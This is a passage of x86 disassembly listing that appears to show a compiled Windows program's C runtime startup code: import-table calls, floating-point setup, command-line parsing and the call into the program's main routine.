  401d4d:	ff 15 88 20 40 00    	call   *0x402088
  401d53:	59                   	pop    %ecx
  401d54:	83 0d 54 35 40 00 ff 	orl    $0xffffffff,0x403554
  401d5b:	83 0d 58 35 40 00 ff 	orl    $0xffffffff,0x403558
  401d62:	ff 15 84 20 40 00    	call   *0x402084
  401d68:	8b 0d cc 32 40 00    	mov    0x4032cc,%ecx
  401d6e:	89 08                	mov    %ecx,(%eax)
  401d70:	ff 15 80 20 40 00    	call   *0x402080
  401d76:	8b 0d c8 32 40 00    	mov    0x4032c8,%ecx
  401d7c:	89 08                	mov    %ecx,(%eax)
  401d7e:	a1 7c 20 40 00       	mov    0x40207c,%eax
  401d83:	8b 00                	mov    (%eax),%eax
  401d85:	a3 5c 35 40 00       	mov    %eax,0x40355c
  401d8a:	e8 10 01 00 00       	call   0x401e9f
  401d8f:	39 1d bc 32 40 00    	cmp    %ebx,0x4032bc
  401d95:	75 0c                	jne    0x401da3
  401d97:	68 9c 1e 40 00       	push   $0x401e9c
  401d9c:	ff 15 78 20 40 00    	call   *0x402078
  401da2:	59                   	pop    %ecx
  401da3:	e8 e2 00 00 00       	call   0x401e8a
  401da8:	68 0c 30 40 00       	push   $0x40300c
  401dad:	68 08 30 40 00       	push   $0x403008
  401db2:	e8 cd 00 00 00       	call   0x401e84
  401db7:	a1 c4 32 40 00       	mov    0x4032c4,%eax
  401dbc:	89 45 94             	mov    %eax,-0x6c(%ebp)
  401dbf:	8d 45 94             	lea    -0x6c(%ebp),%eax
  401dc2:	50                   	push   %eax
  401dc3:	ff 35 c0 32 40 00    	push   0x4032c0
  401dc9:	8d 45 9c             	lea    -0x64(%ebp),%eax
  401dcc:	50                   	push   %eax
  401dcd:	8d 45 90             	lea    -0x70(%ebp),%eax
  401dd0:	50                   	push   %eax
  401dd1:	8d 45 a0             	lea    -0x60(%ebp),%eax
  401dd4:	50                   	push   %eax
  401dd5:	ff 15 70 20 40 00    	call   *0x402070
  401ddb:	68 04 30 40 00       	push   $0x403004
  401de0:	68 00 30 40 00       	push   $0x403000
  401de5:	e8 9a 00 00 00       	call   0x401e84
  401dea:	83 c4 24             	add    $0x24,%esp
  401ded:	a1 6c 20 40 00       	mov    0x40206c,%eax
  401df2:	8b 30                	mov    (%eax),%esi
  401df4:	89 75 8c             	mov    %esi,-0x74(%ebp)
  401df7:	80 3e 22             	cmpb   $0x22,(%esi)
  401dfa:	75 3a                	jne    0x401e36
  401dfc:	46                   	inc    %esi
  401dfd:	89 75 8c             	mov    %esi,-0x74(%ebp)
  401e00:	8a 06                	mov    (%esi),%al
  401e02:	3a c3                	cmp    %bl,%al
  401e04:	74 04                	je     0x401e0a
  401e06:	3c 22                	cmp    $0x22,%al
  401e08:	75 f2                	jne    0x401dfc
  401e0a:	80 3e 22             	cmpb   $0x22,(%esi)
  401e0d:	75 04                	jne    0x401e13
  401e0f:	46                   	inc    %esi
  401e10:	89 75 8c             	mov    %esi,-0x74(%ebp)
  401e13:	8a 06                	mov    (%esi),%al
  401e15:	3a c3                	cmp    %bl,%al
  401e17:	74 04                	je     0x401e1d
  401e19:	3c 20                	cmp    $0x20,%al
  401e1b:	76 f2                	jbe    0x401e0f
  401e1d:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  401e20:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401e23:	50                   	push   %eax
  401e24:	ff 15 58 20 40 00    	call   *0x402058
  401e2a:	f6 45 d0 01          	testb  $0x1,-0x30(%ebp)
  401e2e:	74 11                	je     0x401e41
  401e30:	0f b7 45 d4          	movzwl -0x2c(%ebp),%eax
  401e34:	eb 0e                	jmp    0x401e44
  401e36:	80 3e 20             	cmpb   $0x20,(%esi)
  401e39:	76 d8                	jbe    0x401e13
  401e3b:	46                   	inc    %esi
  401e3c:	89 75 8c             	mov    %esi,-0x74(%ebp)
  401e3f:	eb f5                	jmp    0x401e36
  401e41:	6a 0a                	push   $0xa
  401e43:	58                   	pop    %eax
  401e44:	50                   	push   %eax
  401e45:	56                   	push   %esi
  401e46:	53                   	push   %ebx
  401e47:	53                   	push   %ebx
  401e48:	ff 15 3c 20 40 00    	call   *0x40203c
  401e4e:	50                   	push   %eax
  401e4f:	e8 7c fa ff ff       	call   0x4018d0
  401e54:	89 45 98             	mov    %eax,-0x68(%ebp)
  401e57:	50                   	push   %eax
  401e58:	ff 15 68 20 40 00    	call   *0x402068
  401e5e:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401e61:	8b 08                	mov    (%eax),%ecx
  401e63:	8b 09                	mov    (%ecx),%ecx
  401e65:	89 4d 88             	mov    %ecx,-0x78(%ebp)
  401e68:	50                   	push   %eax
  401e69:	51                   	push   %ecx
  401e6a:	e8 0f 00 00 00       	call   0x401e7e
  401e6f:	59                   	pop    %ecx
  401e70:	59                   	pop    %ecx
  401e71:	c3                   	ret
  401e72:	8b 65 e8             	mov    -0x18(%ebp),%esp
  401e75:	ff 75 88             	push   -0x78(%ebp)
  401e78:	ff 15 60 20 40 00    	call   *0x402060
  401e7e:	ff 25 64 20 40 00    	jmp    *0x402064
  401e84:	ff 25 74 20 40 00    	jmp    *0x402074
  401e8a:	68 00 00 03 00       	push   $0x30000
  401e8f:	68 00 00 01 00       	push   $0x10000
  401e94:	e8 0d 00 00 00       	call   0x401ea6
  401e99:	59                   	pop    %ecx
  401e9a:	59                   	pop    %ecx
  401e9b:	c3                   	ret
  401e9c:	33 c0                	xor    %eax,%eax
  401e9e:	c3                   	ret
  401e9f:	c3                   	ret
  401ea0:	ff 25 8c 20 40 00    	jmp    *0x40208c
  401ea6:	ff 25 90 20 40 00    	jmp    *0x402090
